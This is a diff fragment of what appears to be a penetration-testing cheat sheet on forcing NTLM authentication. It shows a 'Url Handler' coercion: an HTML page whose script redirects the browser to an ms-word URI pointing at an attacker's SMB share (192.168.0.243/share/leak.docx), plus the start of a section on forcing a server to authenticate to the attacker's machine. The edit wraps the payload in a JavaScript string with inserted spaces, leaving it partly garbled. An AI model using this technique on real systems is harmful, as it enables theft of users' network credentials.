@@ -339,12 +339,19 @@ IconIndex=1
 </Relationships>
 
 #### Coerce 5 - Url Handler
-<!DOCTYPE html>
+ 
+
+ ```js
+let foo = '<!DOCTYPE html>
 <html>
 	<script>
-		location.href = 'ms-word:ofe|u|\\192.168.0.243/share/leak.docx';
+		location.href = 'ms        -word:        ofe|u|\\192.168.0.243/share/leak.docx';
 	</script>
-</html>
+</html>';
+
+console.log(foo);
+```
+
 
 #### Coerce 6 - w/ Creds - Coercer forced authentication of a server to our machine
 listen="192.168.0.243"
